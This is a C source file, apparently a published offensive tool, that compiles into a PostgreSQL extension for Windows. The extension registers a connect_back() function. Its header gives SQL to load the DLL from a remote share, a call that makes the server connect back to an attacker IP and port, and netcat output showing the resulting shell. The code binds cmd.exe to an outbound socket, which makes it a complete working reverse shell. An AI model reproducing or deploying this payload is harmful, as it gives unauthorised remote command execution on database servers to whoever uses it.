/*

pgpwn.c
date: 23/11/2016
Developed by: mr_me

Synopsis:
=========

This code creates a postgres extension that registers a connect_back() function
allowing an attacker to gain a reverse shell.

Motivation:
===========

A zero-day that runs the postgres user as SYSTEM and whereby I could not gain rce via writing to disk without a reboot.

Benefits:
=========

- No touching disk...

Example Usage:
==============

1. Register the function:
-------------------------

CREATE FUNCTION connect_back(text, integer) RETURNS void
AS $$\\vmware-host\Shared Folders\research\DemoExtension.dll$$, $$connect_back$$
LANGUAGE C STRICT;

That loads the DLL from remote, via a share! ;-)

2. Execute it:
--------------

SELECT connect_back('172.16.175.1', 1234);

3. On the 'attackers' machine:
------------------------------

saturn:~ mr_me$ nc -lv 1234
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files\PostgreSQL\9.2\data>whoami
whoami
nt authority\network service

C:\Program Files\PostgreSQL\9.2\data>

4. Now, if you want to remove it, simply: 
-----------------------------------------

DROP FUNCTION connect_back(text, integer);

References:
===========

1. http://blog.2ndquadrant.com/compiling-postgresql-extensions-visual-studio-windows/

License:
========

This code is licensed under the Creative Commons Attribution-Non‑Commercial 4.0 International License.

*/

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include <winsock2.h>
#include "utils/builtins.h"
#pragma comment(lib, "ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(connect_back);

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;

Datum
connect_back(PG_FUNCTION_ARGS)
{

    /* convert C string to text pointer */
    #define GET_TEXT(cstrp) \
    DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))

    /* convert text pointer to C string */
    #define GET_STR(textp) \
    DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(PG_GETARG_INT32(1));
    hax.sin_addr.s_addr = inet_addr(GET_STR(PG_GETARG_TEXT_P(0)));

    WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    PG_RETURN_VOID();
}
